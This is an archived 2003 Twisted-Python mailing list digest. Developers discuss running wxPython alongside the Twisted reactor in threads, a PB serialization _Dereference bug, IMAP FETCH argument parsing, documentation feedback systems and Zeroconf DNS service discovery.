Message-ID: <200307051300.19978.uwe@oss4u.com>

On Saturday 05 July 2003 11:48 am, Patrik Blommaskog wrote:
> > -----Original Message-----
> > From: twisted-python-admin at twistedmatrix.com
> > [mailto:twisted-python-admin at twistedmatrix.com]On Behalf Of Uwe C.
> > Schroeder
> > Sent: den 5 juli 2003 19:57
> > To: twisted-python at twistedmatrix.com
> > Subject: Re: [Twisted-Python] wxPython locking the event processing?
> >
> > On Saturday 05 July 2003 10:14 am, Itamar Shtull-Trauring wrote:
> > > On Sat, 5 Jul 2003 18:24:49 +0200
> > >
> > > "Patrik Blommaskog" <pb_twisted at olga.mine.nu> wrote:
> > > > Meanwhile, is there anything that I should be aware of considering
> > > > that we now have separate threads for wx and Twisted? Can I for
> > > > example use reactor.callLater() to call methods on wx objects, or
> > > > work with Perspectives, Cacheables, reactor etc from wx event
> > > > handlers without any problems?
> > >
> > > They will break horribly. So, use reactor.callFromThread to call
> > > twisted APIs from wx thread
>
> Good, that's what I did already. :)
>
> So if I understand it correctly, at least reactor.callFromThread (and
> callLater?) are thread safe in this case?
>
> > > and the wx equivalent to call wx APIs from the
> > > twisted thread.
> >
> > The wx equivalent should be wx.CallAfter, which will schedule the given
> > function in the (wx) mainthread.
>
> Thanks!
>
> > Even if you decide to use the unthreaded
> > recipe I posted on activestate, you will still have to call wx
> > functions from outside a twisted callback.
>
> I'm not sure I understand. Do you mean that a reactor.callFromThread won't
> do to, say, insert text into a text control, and I should use wx.CallAfter
> instead, even in your unthreaded recipe?

Depends on what you call. You can set field values. Basically you can call 
anything from a callback that doesn't block. So don't open any modal dialogs 
from a callback. Otherwise setting/getting values etc. works.
Whenever you experience a block, check the callbacks first to see if you're 
opening something that blocks.
I.e. I use error callbacks that open an error message dialog. This will block 
the loop until you close the dialog. In this case the error message dialog is 
fine, since I don't care if it blocks - it's an error anyways, so the user 
has to click it away to continue. Not so with a - say "settings" dialog. The 
user would want to do input there and that won't work. Therefor whenever I 
have to open a modal dialog from a callback, I create a second method for 
that and use wx.CallAfter.

>
> - Patrik
>
>
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python

-- 
	UC

--
Open Source Solutions 4U, LLC	2570 Fleetwood Drive
Phone:  +1 650 872 2425		San Bruno, CA 94066
Cell:   +1 650 302 2405		United States
Fax:    +1 650 872 2417




From pb_twisted at olga.mine.nu  Sat Jul  5 14:41:46 2003
From: pb_twisted at olga.mine.nu (Patrik Blommaskog)
Date: Sat, 5 Jul 2003 22:41:46 +0200
Subject: [Twisted-Python] wxPython locking the event processing?
In-Reply-To: <200307051300.19978.uwe@oss4u.com>
Message-ID: <JAEDJDIBADCJHPFLNEDFKEFKCAAA.pb_twisted@olga.mine.nu>

> > > Even if you decide to use the unthreaded
> > > recipe I posted on activestate, you will still have to call wx
> > > functions from outside a twisted callback.
> >
> > I'm not sure I understand. Do you mean that a
> reactor.callFromThread won't
> > do to, say, insert text into a text control, and I should use
> wx.CallAfter
> > instead, even in your unthreaded recipe?
>
> Depends on what you call. You can set field values. Basically you
> can call
> anything from a callback that doesn't block. So don't open any
> modal dialogs
> from a callback. Otherwise setting/getting values etc. works.
> Whenever you experience a block, check the callbacks first to see
> if you're
> opening something that blocks.
> I.e. I use error callbacks that open an error message dialog.
> This will block
> the loop until you close the dialog. In this case the error
> message dialog is
> fine, since I don't care if it blocks - it's an error anyways, so
> the user
> has to click it away to continue. Not so with a - say "settings"
> dialog. The
> user would want to do input there and that won't work. Therefor
> whenever I
> have to open a modal dialog from a callback, I create a second method for
> that and use wx.CallAfter.

I see, this makes sense. Thanks a lot for the advice.

I´ve got my app working now with the threading method that Philippe
suggested. I think I'll implement your recipe as well, keep them in
parallell for a while, and see if I can learn anything from observing their
behaviors.


- Patrik





From cliechti at gmx.net  Sat Jul  5 16:20:38 2003
From: cliechti at gmx.net (Chris Liechti)
Date: Sun, 06 Jul 2003 00:20:38 +0200
Subject: [Twisted-Python] wxPython locking the event processing?
In-Reply-To: <JAEDJDIBADCJHPFLNEDFKEFKCAAA.pb_twisted@olga.mine.nu>
References: <JAEDJDIBADCJHPFLNEDFKEFKCAAA.pb_twisted@olga.mine.nu>
Message-ID: <3F074F36.4030403@gmx.net>

Patrik Blommaskog wrote:
> I´ve got my app working now with the threading method that Philippe
> suggested. 

it was me that originaly posted that code on this list. and have to say 
that it contains a minor bug. startRunning must be called in the same 
thread as as twisted.mainloop will (otherwise, some nasty things will 
happen, like callFromThread() or stop() not working without an external 
event).
just calling "reactor.run()" in a thread will fail because of the signal 
handlers have to be installed in the main thread, thus these have to be 
disabled.
the stop function can also be improved, so that it does not fail when 
it's called more than once. (wxYield does not like recursive calls to 
itself ;-)

def startTwistedAndWx(app):
     """Start twisteds mainloop it its own thread,
     run the wx mainloop in the main thread"""
     global twistedthread, twistedrunning, twistedapp
     twistedapp = app
     twistedthread = threading.Thread(
         target=reactor.run,
         kwargs={'installSignalHandlers':0}
     )
     twistedthread.start()
     twistedrunning = 1
     app.MainLoop()
     stopTwisted()

def stopTwisted():
     """stop the twisted thread, wx still runs"""
     global twistedthread, twistedrunning
     if twistedrunning:
         twistedrunning = 0
         reactor.stop()
         #wait until reactor has shut down
         while twistedthread.isAlive():
             wxYield()




From illumen at yahoo.com  Sat Jul  5 20:42:51 2003
From: illumen at yahoo.com (Rene Dudfield)
Date: Sun, 06 Jul 2003 12:42:51 +1000
Subject: [Twisted-Python] User notes for documentation.
In-Reply-To: <8AF12E1C-AE9C-11D7-B720-000393C9700E@twistedmatrix.com>
References: <8AF12E1C-AE9C-11D7-B720-000393C9700E@twistedmatrix.com>
Message-ID: <3F078CAB.4030508@yahoo.com>

Greetings again,


I just spent over an hour or so thinking about this.  Directly below 
this is my possibly useful contribution/suggestion, further below are 
some words strung together.

Add a bug report link/form at the bottom of each section of 
documentation.  This can include feedback on the docs, and bug reports.  
Often times when people are looking at docs, it is because they have a 
problem they want a fix for.  So it makes sense to ask for bug reports 
in the docs.  Like the feed back suggestion of Glyphs, automatically 
include a way to track down which document the report was made from.







Glyph Lefkowitz wrote:

>
> On Friday, July 4, 2003, at 10:58 AM, Rene Dudfield wrote:
>
>> A user notes system has these advantages:
>
>
> These are disadvantages.
>
>>  - not having to bother people to post notes
>
>
> This means that the development team remains unaware of bugs, as the 
> user community just works around them rather than helping to fix them.

The development team can get a list of changes to the pages as they 
happen.  Which will mean they are aware of the problem.

Often times a problem can be documentation oriented.  In that people 
don't know how to use a system.  By adding documentation the user 
community can help fix the problem.

You will always find that some people are prepared to help fix bugs in 
libraries.  Others just want to get on with what they were doing.  Maybe 
you don't want those people using your code?  Which is fine I guess :)

If there are work arounds listed as a user note, then there are two 
things which can happen because of it.  The developers, and users can 
ignore the problem, or the frame work can be fixed to make the work 
around unnessesary.  Allowing people to see if a work around is 
neccesary is probably more benificial.  If you're suggesting that users 
would rather have something working than have to work around bugs, then 
sometimes you would be correct.  No one likes to run into bugs which 
lots of people have encountered.



>
>>  - being easier for people to add a note about something as they are 
>> reading
>
>
> This ease of posting comments and lack of editorial review means that 
> half of the comments will be badly written and the other half will 
> simply be wrong. 

Editorial review remains.  Every now and then(possibly as soon as the 
note is posted) editors can go through the notes to fix up problems.  Or 
as you suggest, having the notes not appear on the page at all, but 
having them sent to a group of editors would be good.

Also other users can post notes about wrong comments which remain.

>
>
> I am strongly opposed to having user-comments on the documentation 
> because it encourages half-assed fixes to problems, both documentation 
> and otherwise.

How does it do this?

I can see how it encourages people to share their experiences about the 
part being documented.  People see how others have noted something 
down.  People feel like they are expected to note down any problems, 
insights, etc.

Often times when people are reading the documentation they are looking 
to solve a problem they have had.  There are other reasons, but that is 
a big one.  So perhaps a bug report form/link at the bottom of the page 
would be good?


>
> However, a snippet at the bottom of each page that said "Is this 
> documentation frustratingly incomplete or incorrect?  Please send 
> feedback to twisted-python at twistedmatrix.com" followed by a suitably 
> munged mailto: hyperlink that will put some information about which 
> page is being referred to in the topic of the message.

Good idea.  That would be quite easy to implement as well.  A bug report 
link/form could be good too.

>
> Also if someone wants to take over as the documentation editor, I will 
> gladly cede decisions like this one to them.  The biggest reason that 
> we don't have very good documentation is that nobody makes it their 
> primary responsibility.
>
Some of the documentation is quite good.  The perspective broker parts 
have been improved lots since I last read them 6-12 months ago.  There's 
also beginning to be some articles written using twisted from sources 
outside the twisted hive mind, which is good.

Another good addition to the docs would be a listing of significant api 
changes.  If it's not in there allready somewhere.  eg differences 
between 1.02 and 1.03, 1.03- 1.04, 1.05-1.06, etc.






From andrew-twisted at puzzling.org  Sat Jul  5 21:51:57 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Sun, 6 Jul 2003 13:51:57 +1000
Subject: [Twisted-Python] User notes for documentation.
In-Reply-To: <3F078CAB.4030508@yahoo.com>
References: <8AF12E1C-AE9C-11D7-B720-000393C9700E@twistedmatrix.com> <3F078CAB.4030508@yahoo.com>
Message-ID: <20030706035157.GA11835@frobozz>

On Sun, Jul 06, 2003 at 12:42:51PM +1000, Rene Dudfield wrote:
[...]
> 
> Add a bug report link/form at the bottom of each section of 
> documentation.  This can include feedback on the docs, and bug reports.  
> Often times when people are looking at docs, it is because they have a 
> problem they want a fix for.  So it makes sense to ask for bug reports 
> in the docs.  Like the feed back suggestion of Glyphs, automatically 
> include a way to track down which document the report was made from.

I agree that something like this should be added to the documentation
template.

> Also other users can post notes about wrong comments which remain.

GAH!

So rather than just getting the docs fixed, you'd get band-aids being put on
band-aids, because the first band-aid was broken!  This is why I, as a
reader, don't like user comment systems: as you read a document's comments,
you have to keep mentally shifting your view of what you've just been told,
because the comments will contradict the docs, and each other, and you have
to keep mentally backtracking to figure it all out.  

We should be striving for the docs which are correct, and make sense on
first reading, rather than requiring the reader to continually re-read
paragraphs because a comment added "but that only applies when using Foo".  

Perhaps the strongest argument I can make against this is the Zope 2 docs --
user comments have not made them magically useful.  On the contrary, I've
found them to be neglected and incomplete, despite the efforts of the large
Zope community.

You can't fix docs by people scattering little two-liners here and there
saying "actually, that didn't work for me."  

Let people post comments to a real mailing-list.

> Another good addition to the docs would be a listing of significant api 
> changes.  If it's not in there allready somewhere.  eg differences 
> between 1.02 and 1.03, 1.03- 1.04, 1.05-1.06, etc.

That's what the ChangeLog file in the distribution is for, although it's not
readily accessible as a link off the website.  To a lesser extent the
release announcements do this as well; they usually mention the major new
features.  We are generally very good at being backwards-compatible, so
perhaps the best source of details about the changes are any
DeprecationWarnings you get running your code with a new release ;)

-Andrew.




From lafou at wanadoo.fr  Sun Jul  6 01:53:11 2003
From: lafou at wanadoo.fr (Philippe =?ISO-8859-1?Q?Lafoucri=E8re?=)
Date: 06 Jul 2003 09:53:11 +0200
Subject: [Twisted-Python] wxPython locking the event processing?
In-Reply-To: <3F074F36.4030403@gmx.net>
References: <JAEDJDIBADCJHPFLNEDFKEFKCAAA.pb_twisted@olga.mine.nu>
	 <3F074F36.4030403@gmx.net>
Message-ID: <1057477990.8472.1.camel@biproc>

> it was me that originaly posted that code on this list. and have to say 
> that it contains a minor bug. startRunning must be called in the same 
> thread as as twisted.mainloop will (otherwise, some nasty things will 
> happen, like callFromThread() or stop() not working without an external 
> event).

Excuse me Chris, I forgot the copyright  :p
Seriously, this wasn't intentional !






From ecn at metaslash.com  Sun Jul  6 07:28:01 2003
From: ecn at metaslash.com (Eric C. Newton)
Date: Sun, 6 Jul 2003 09:28:01 -0400
Subject: [Twisted-Python] twistd man page
Message-ID: <20030706132801.GA1230@localhost.localdomain>

Twisted 1.0.5

A number of options to twistd are missing from the man page.

	--savestats
	--originalname
	--euid
	--encrypted
	--reactor
	--report-profile

-Eric



From josephwinston at mac.com  Sun Jul  6 07:59:05 2003
From: josephwinston at mac.com (Jody Winston)
Date: Sun, 06 Jul 2003 08:59:05 -0500
Subject: [Twisted-Python] Finding peers.
Message-ID: <16136.11049.63479.337891@frank.xprtcc.com>

I'm also interested in using Rendezvous in twisted.  I don't have much
time at the present to both learn Rendezvous and the internals of
twisted but I'll pass on two links if you haven't seen them.  The
first link is http://dotlocal.org/ and they are "Software developers
interested in implementing zeroconf, multicast dns and dns service
discovery".  The second link is a Python implementation of Rendezvous,
PyRendezvous, which can be found at..
http://radio.weblogs.com/0105002/stories/2003/01/06/multicastDnsServiceDiscoverForPython.html




From ecn at metaslash.com  Sun Jul  6 10:48:21 2003
From: ecn at metaslash.com (Eric C. Newton)
Date: Sun, 6 Jul 2003 12:48:21 -0400
Subject: [Twisted-Python] bad instructions in twisted emacs
Message-ID: <20030706164821.GA4645@localhost.localdomain>

TwistedEmacs-0.2.0

twisted-dev.el, line 5

	;;   (setq load-path (cons "path/to/TwistedEmacs"))

should be

	;;   (setq load-path (cons "path/to/TwistedEmacs" load-path))

-Eric




From pb_twisted at olga.mine.nu  Sun Jul  6 14:10:33 2003
From: pb_twisted at olga.mine.nu (Patrik Blommaskog)
Date: Sun, 6 Jul 2003 22:10:33 +0200
Subject: [Twisted-Python] Why do I get a _Dereference instance?
Message-ID: <JAEDJDIBADCJHPFLNEDFGEFMCAAA.pb_twisted@olga.mine.nu>

Hi list,

I'm using PB to transfer the following structure (with a circular reference)
on the server (cut down, incomplete code from my app) to a client:

class Inventory(pb.Cacheable):
    def __init__(self, ownerActor):
        self.owner = ownerActor

    def getStateToCacheAndObserveFor(self, perspective, observer):
        return {"owner" : self.owner}


class PlayerActor(pb.Cacheable):
    def __init__(self):
	  self.name = "MyName"
        self.inventory = Inventory(self)

    def getStateToCacheAndObserveFor(self, perspective, observer):
        return {"inventory" : self.inventory}


On the client, these classes correspond to RemoteInventory and RemoteActor
respectively.

What ends up on the client is an actor with the following __dict__:

{'inventory': <RemoteInventory.RemoteInventory instance at 0x01CE4DA8>,
'broker': <twisted.spread.pb.Broker instance at 0x01C8D588>, 'luid': 5,
'name': 'MyName'}

As expected. However, the inventory:

{'owner': <twisted.persisted.crefutil._Dereference instance at 0x01C90BE0>,
'broker': <twisted.spread.pb.Broker instance at 0x01C8D588>, 'luid': 6}

My client-side inventory owner attribute refers to a _Dereference object
instead of the actor object. I don't know much about Twisted's Jelly, but it
sounds like something that should be removed automatically at the end of the
de-serialization process.

I notice that I can access my inventory.owner.resolvedObject to get the
actual actor object I want, but I cannot access it directly through the
_Dereference object (e.g. inventory.owner.name) as if though it were a proxy
or something. So why is it there, and can/should I get rid of it?

I am sure there is a logic to this, which I'd be grateful if someone would
like to explain to me or, better yet, point me to some nice bedtime reading
on the subject.


- Patrik





From gp.ciceri at acm.org  Sun Jul  6 14:12:16 2003
From: gp.ciceri at acm.org (gian paolo ciceri)
Date: Sun, 06 Jul 2003 22:12:16 +0200
Subject: [Twisted-Python] FYI: sample of interpreted CGI usage in twisted (1.0.6, for windows)
Message-ID: <3F0882A0.1070208@acm.org>

Hello all,
yesterday I've discussed with Itamar in chat
about this setup. He suggested to me to send the
example to the mailing list, for future reference.
It seems that the interesting thing is that it
works on windows, with an interpreted script as cgi.

I use it for moinmoin under twisted.

You've to use the win32 reactor, of course.

Thanks for your attention, have a nice day.

Regards.
/gp

##############################################################
import os
from twisted.internet import app
from twisted.web import static, server, vhost, twcgi, script, trp


root = static.File(os.getcwd() + "/public_html")

class PythonCGIScript(twcgi.FilteredScript):
     filter = 'c:\\Python22\\python.exe' # Points to the python parser

root.processors = {
             '.pcgi': PythonCGIScript,
             '.epy': script.PythonScript,
             '.rpy': script.ResourceScript,
             '.trp': trp.ResourceUnpickler,
}
root.putChild('vhost', vhost.VHostMonsterResource())
site = server.Site(root)
application = app.Application('web')
application.listenTCP(10999, site)
#####################################################################





From itamar at itamarst.org  Sun Jul  6 14:21:26 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Sun, 6 Jul 2003 16:21:26 -0400
Subject: [Twisted-Python] Why do I get a _Dereference instance?
In-Reply-To: <JAEDJDIBADCJHPFLNEDFGEFMCAAA.pb_twisted@olga.mine.nu>
References: <JAEDJDIBADCJHPFLNEDFGEFMCAAA.pb_twisted@olga.mine.nu>
Message-ID: <20030706162127.15228464.itamar@itamarst.org>

On Sun, 6 Jul 2003 22:10:33 +0200
"Patrik Blommaskog" <pb_twisted at olga.mine.nu> wrote:

> I am sure there is a logic to this, which I'd be grateful if someone
> would like to explain to me or, better yet, point me to some nice
> bedtime reading on the subject.

Sounds like a bug, actually :)

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From pb_twisted at olga.mine.nu  Sun Jul  6 16:20:32 2003
From: pb_twisted at olga.mine.nu (Patrik Blommaskog)
Date: Mon, 7 Jul 2003 00:20:32 +0200
Subject: [Twisted-Python] Why do I get a _Dereference instance?
In-Reply-To: <20030706162127.15228464.itamar@itamarst.org>
Message-ID: <JAEDJDIBADCJHPFLNEDFOEFNCAAA.pb_twisted@olga.mine.nu>

> > I am sure there is a logic to this, which I'd be grateful if someone
> > would like to explain to me or, better yet, point me to some nice
> > bedtime reading on the subject.
>
> Sounds like a bug, actually :)

Ouch, that is not what I wanted to hear. I experimented with it a bit
further by mutating the duck pond example, and found that:

	def setCopyableState(self, state):
	    self.__dict__.update(state)

gives the strange behavior:

	{'pond': <twisted.persisted.crefutil._Dereference instance at 0x009A1CE8>,
'broker': <twisted.spread.pb.Broker instance at 0x009AD1B0>, 'luid': 2}


While:
	def setCopyableState(self, state):
	    self.__dict__ = state

Gives the expected:

	{'pond': <cache_classes.SlaveDuckPond instance at 0x009AD8E8>, 'broker':
<twisted.spread.pb.Broker instance at 0x009AD450>, 'luid': 2}



Also, we have the peculiar case:

	def setCopyableState(self, state):
	    self.__dict__.update(state)
	    self.foo = state

Which gives:

	{'pond': <twisted.persisted.crefutil._Dereference instance at 0x009B5ED8>,
'foo': {'pond': <cache_classes.SlaveDuckPond instance at 0x009AD808>},
'broker': <twisted.spread.pb.Broker instance at 0x009AD1B0>, 'luid': 2}

So the item in 'foo' is dereferenced as expected, while __dict__["pond"] is
not. Go figure!


This feels like the twilight zone. Can somebody please tell me what is going
on? I have attached the code for my experiment.


- Patrik
-------------- next part --------------
An embedded and charset-unspecified text was scrubbed...
Name: cache_classes.py
URL: </pipermail/twisted-python/attachments/20030707/e0db713e/attachment.ksh>
-------------- next part --------------
An embedded and charset-unspecified text was scrubbed...
Name: cache_receiver.py
URL: </pipermail/twisted-python/attachments/20030707/e0db713e/attachment-0001.ksh>
-------------- next part --------------
An embedded and charset-unspecified text was scrubbed...
Name: cache_sender.py
URL: </pipermail/twisted-python/attachments/20030707/e0db713e/attachment-0002.ksh>

From pb_twisted at olga.mine.nu  Sun Jul  6 16:45:16 2003
From: pb_twisted at olga.mine.nu (Patrik Blommaskog)
Date: Mon, 7 Jul 2003 00:45:16 +0200
Subject: [Twisted-Python] Why do I get a _Dereference instance?
In-Reply-To: <JAEDJDIBADCJHPFLNEDFOEFNCAAA.pb_twisted@olga.mine.nu>
Message-ID: <JAEDJDIBADCJHPFLNEDFIEFOCAAA.pb_twisted@olga.mine.nu>

> Also, we have the peculiar case:
>
> 	def setCopyableState(self, state):
> 	    self.__dict__.update(state)
> 	    self.foo = state
>
> Which gives:
>
> 	{'pond': <twisted.persisted.crefutil._Dereference instance
> at 0x009B5ED8>,
> 'foo': {'pond': <cache_classes.SlaveDuckPond instance at 0x009AD808>},
> 'broker': <twisted.spread.pb.Broker instance at 0x009AD1B0>, 'luid': 2}
>
> So the item in 'foo' is dereferenced as expected, while
> __dict__["pond"] is
> not. Go figure!

Never mind this last one, I didn't think far enough there. While it works,
this is what I should have tried, and it doesn't work:

	def setCopyableState(self, state):
	    self.__dict__.update(state)
	    self.foo = state["pond"]


My guess, and I really should know better than to make guesses after
midnight, is that the dereferencing mechanism only works with the 'state'
dictionary itself. That is, in the post processing, it substitutes the real
object references for the _Dereference values in the 'state' dictionary for
the keys it knows. As long as I keep the original state dictionary as master
data, at least until the deserializing is done, everything will work as
expected.

Thinking a little more (still on the wrong side of midnight), I can't really
see a Pythonic way of how the dereferencing mechanism could be solved the
way I initially wanted, i.e. self.__dict__.update(state). I can only come up
with a solution where the _Dereference would have to work as a proxy, and I
guess that there could be some severe side effects.

Unless someone (on the right side of midnight) can suggest something or
point out the error in my thinking, I think I will have to redesign my data
strategy somewhat.


- Patrik





From 2002 at weholt.org  Sun Jul  6 17:43:57 2003
From: 2002 at weholt.org (Thomas Weholt)
Date: Mon, 7 Jul 2003 01:43:57 +0200
Subject: [Twisted-Python] RFC : Test implementation. Need comments
Message-ID: <005301c34418$7855f930$0401a8c0@razor>

Hi,

To get the hang of Twisted I've tried to port an old BaseHTTPServer-based
project, or at least parts of it. It loads dynamic pages, ie. Twisted
Resources, dynamically. It's *very* crude and ugly code, but I just would
like to get some comments to see if I'm on a totally wrong track here.

It's been a couple of days since I wrote the code and I've had time to
implement another, more complete version, with XML-RPC support, modules with
RPC-methods loaded dynamically also. Will include SOAP support very soon. It
also "solves" the problem of what to put where when deplyoing Twisted-web
applications; I've created a folder structure looking like this :

1. wwwroot/pages -> modules for dynamic pages, ie. subclassing Resource
2. wwwroot/static -> images and other static content
3. application/data -> all data, like database files etc. are stored here
4. application/config -> all config files are stored here. Using INI-files
for now, dynamically loaded into the service object
5. application/rpc -> modules with rpc-methods, available in both XML-RPC
and SOAP at the same time. Loaded dynamically
6. application/businessobjects -> objects solving logic and storing/loading
data, loaded dynamically, available to and used by rpc-classes and dynamic
pages.

( the version online does not use this structure, but something simpler )

My latest version uses mainly the same method to load all the other
dynamically loaded stuff, so the version online will give you an idea of
what I'm doing. If my first attempt available now is not totally off, I'll
make the next version available sometime tomorrow. If not I'll take the
comments on this one and re-write the current implementations based on ideas
or comments from the list.

The files are available at :
http://home.online.no/~t-weh/articles/projects/elope/elopetestimplementation
.zip
Extract them into your python-path and start the file in the
testsite-folder.

For now what I'm mainly looking for is a cleaner, more Twisted way of
loading the page-Resources and how to use the Twisted-Service-class
properly. For now it holds all configuration data in the entire application,
rpc-methods, businessobjects available for the entire application and later
it will hold some scheduled method-calls to dynamically loaded objects doing
specific tasks. I do not know if this is the proper way to do this.

Best regards,
Thomas




From ta-meyer at ihug.co.nz  Sun Jul  6 21:57:45 2003
From: ta-meyer at ihug.co.nz (Tony Meyer)
Date: Mon, 7 Jul 2003 15:57:45 +1200
Subject: [Twisted-Python] Re: IMAP fixes
In-Reply-To: <1ED4ECF91CDED24C8D012BCF2B034F1302393E80@its-xchg4.massey.ac.nz>
Message-ID: <1ED4ECF91CDED24C8D012BCF2B034F1318CF01@its-xchg4.massey.ac.nz>

Regarding the new parameter parsing for the IMAP server:

At the moment, FETCH args are parsed with ParseNestedList, which means that
any items inside [] are appended as an additional list.

For example, this command:
    0003 FETCH 1 BODY.PEEK[HEADER.FIELDS (References X-Ref)] UID
Becomes:
    ['BODY.PEEK', ['HEADER.FIELDS', ['References', 'X-Ref']], UID]

There are really two items that have been requested - BODY.PEEK and UID, but
the args list has three, because the BODY.PEEK information has been split
into a separate item.

It seems to me that it would make more sense for the result to be:
    [['BODY.PEEK', ['HEADER.FIELDS', ['References', 'X-Ref']]], UID]
Or something like that, which keeps the body.peek information together.
(Note that BODY and BODY.PEEK are the only two FETCH args that have a []
part.)

This is both closer to what was requested, and much easier to parse (IMO).

Thoughts?  (I'm happy to write a patch, but there doesn't seem much point if
people don't agree).

=Tony Meyer




From exarkun at twistedmatrix.com  Mon Jul  7 01:24:35 2003
From: exarkun at twistedmatrix.com (Jp Calderone)
Date: Mon, 7 Jul 2003 03:24:35 -0400
Subject: [Twisted-Python] Re: IMAP fixes
In-Reply-To: <1ED4ECF91CDED24C8D012BCF2B034F1318CF01@its-xchg4.massey.ac.nz>
References: <1ED4ECF91CDED24C8D012BCF2B034F1302393E80@its-xchg4.massey.ac.nz> <1ED4ECF91CDED24C8D012BCF2B034F1318CF01@its-xchg4.massey.ac.nz>
Message-ID: <20030707072435.GA32716@intarweb.us>

On Mon, Jul 07, 2003 at 03:57:45PM +1200, Tony Meyer wrote:
> Regarding the new parameter parsing for the IMAP server:
> 
> At the moment, FETCH args are parsed with ParseNestedList, which means that
> any items inside [] are appended as an additional list.
> 
> For example, this command:
>     0003 FETCH 1 BODY.PEEK[HEADER.FIELDS (References X-Ref)] UID
> Becomes:
>     ['BODY.PEEK', ['HEADER.FIELDS', ['References', 'X-Ref']], UID]
> 
> There are really two items that have been requested - BODY.PEEK and UID, but
> the args list has three, because the BODY.PEEK information has been split
> into a separate item.

  Ideally, I'd like to see this parsed into a structure resembling this:

    [Header(peek=1, name=1, value=1, ['References', 'X-Ref']), UID()]

  The mailbox implementation should have as little knowledge of IMAP4 as
humanly possible.  The current implementation is an example of the "just
enough to work" philosophy.  parseNestedList was actually hacked pretty
awfully to support this after I initially wrote it, because I'd forgotten
about this particular aspect of the IMAP4 query syntax.

> 
> It seems to me that it would make more sense for the result to be:
>     [['BODY.PEEK', ['HEADER.FIELDS', ['References', 'X-Ref']]], UID]
> Or something like that, which keeps the body.peek information together.
> (Note that BODY and BODY.PEEK are the only two FETCH args that have a []
> part.)
> 

  It does seem like a slight improvement, but I'm not sure it is significant
enough to merit a stop in the API roadmap.  On the other hand, if you're
willing to implement it... ;)


> This is both closer to what was requested, and much easier to parse (IMO).

  Parsing the current form isn't so bad.  Here's a snippet from the mailbox
I've written:

        i = 0
        r = {}
        L = len(parts)
        while i < L:
            p = parts[i]
            fn = p.upper().replace('.', '_')
            f = getattr(self, '_fetch_' + fn, None)
            if not f:
                raise NotImplementedError, fn
            if i + 1 < L:
                if isinstance(parts[i + 1], types.ListType):
                    r.update(f(msg, parts[i + 1]))
                    i += 2
                    continue
            r.update(f(msg))
            i += 1
        return r

  The key section of interest here is the isinstance() check (the loop
dispatches actual fetching to methods named like "_fetch_BODY_PEEK" and so
on).  I believe parsing an alternate form that continued to intersperse
lists with strings would be pretty similar, with just a few checks
re-arranged.

  Would you be interested in patching the fetch methods to generate a
structure like the one I described above?  Or if you have another idea for a
parsed query structure that is similarly abstracted away from the protocol,
I'd be glad to entertain it.

  Lastly, I definitely recognize this as a weak point in the IMAP4 code, but
fixing it has not yet become a priority, as I already have a working parser.

  Jp

-- 
A disciple of another sect once came to Drescher as he was eating his
morning meal. "I would like to give you this personality test," said the
outsider, "because I want you to be happy." Drescher took the paper that was
offered him and put it into the toaster: "I wish the toaster to be happy, 
too."



From ta-meyer at ihug.co.nz  Mon Jul  7 01:36:58 2003
From: ta-meyer at ihug.co.nz (Tony Meyer)
Date: Mon, 7 Jul 2003 19:36:58 +1200
Subject: [Twisted-Python] Re: IMAP fixes
In-Reply-To: <1ED4ECF91CDED24C8D012BCF2B034F13023945D7@its-xchg4.massey.ac.nz>
Message-ID: <1ED4ECF91CDED24C8D012BCF2B034F1318CF02@its-xchg4.massey.ac.nz>

> Ideally, I'd like to see this parsed into a structure resembling this:
> 
>     [Header(peek=1, name=1, value=1, ['References', 'X-Ref']), UID()]

That looks fine to me.

> Parsing the current form isn't so bad.  Here's a snippet 
> from the mailbox I've written:
[...]

Thanks for that.  It's nicer than what I've got at the moment, although
similar in form.

>   Would you be interested in patching the fetch methods to 
> generate a structure like the one I described above?

Yes.  I'll try and get to this shortly.  Although I've done a stopgap
solution, I would rather create a patch and have a nicer solution :)

>   Lastly, I definitely recognize this as a weak point in the 
> IMAP4 code, but fixing it has not yet become a priority, as I 
> already have a working parser.

:)  You're ahead of me there, although I'm slowly getting closer.

=Tony Meyer




From screwtape at froup.com  Mon Jul  7 07:38:38 2003
From: screwtape at froup.com (Tim Allen)
Date: Mon, 7 Jul 2003 23:38:38 +1000
Subject: [Twisted-Python] Finding peers.
In-Reply-To: <16136.11049.63479.337891@frank.xprtcc.com>
Message-ID: <50E0FAB5-B080-11D7-BA53-003065D61A3E@froup.com>

On Sunday, Jul 6, 2003, at 23:59 Australia/Sydney, Jody Winston wrote:
> I'm also interested in using Rendezvous in twisted.  I don't have much
> time at the present to both learn Rendezvous and the internals of
> twisted but I'll pass on two links if you haven't seen them.  The
> first link is http://dotlocal.org/ and they are "Software developers
> interested in implementing zeroconf, multicast dns and dns service
> discovery".  The second link is a Python implementation of Rendezvous,
> PyRendezvous, which can be found at..
> http://radio.weblogs.com/0105002/stories/2003/01/06/ 
> multicastDnsServiceDiscoverForPython.html

I just spend a day or so reading about ZeroConf and Twisted's DNS  
support, and hacking together the attached code.

The quick, quick summary is this: ZeroConf has two important parts:  
DNS-SD and mDNS.

DNS-SD (DNS based Service Discovery) is the easy part - it's just a  
standard way of organising DNS records such that a set of DNS queries  
can create a useful list of things to connect to. 'Implementing' DNS-SD  
support is not at all difficult, providing there exists an API to  
request PTR and SRV records, and providing you can add them to your DNS  
server.

mDNS (Multicast DNS) is more complex, and seems to require  
operating-system cooperation. Regular DNS queries to the magic address  
224.0.0.251 on port 5353 UDP are declared to be multicast queries, and  
link-local. Also, any attempt to resolve any address ending in '.local'  
should be done via multicast. With multicast DNS come some different (I  
think - I don't know DNS all that well) behaviours:
	- When you send a request that you've already got a reply for, you  
should include the
	  list of names you already have, so those services know not to  
respond a second time.
	- Single requests can have multiple replies.
	- You can have a 'continuous request'.

I haven't read the mDNS spec in detail, but the interaction between  
Twisted and the operating system's resolver seems complex. It'd be nice  
if Python had a DNS API more extensive than gethostbyname(), but it  
doesn't.

The attached files are a first draft at a DNS-SD client library for  
Twisted. dns_sd.py contains the meat, and dns_st_client.py is a thin  
wrapper based on doc/examples/dns-service.py dns_sd.py also contains a  
quick hack to make Twisted.Names issue mDNS requests. The end result is  
that on my Powerbook G4 running Mac OS X 10.2.6, I get the following  
output:

$ ./dns_sd_client.py http tcp local
{'instance': u"Tim Allen's Web Site",
  'servers': [('grundoon.local', 80)],
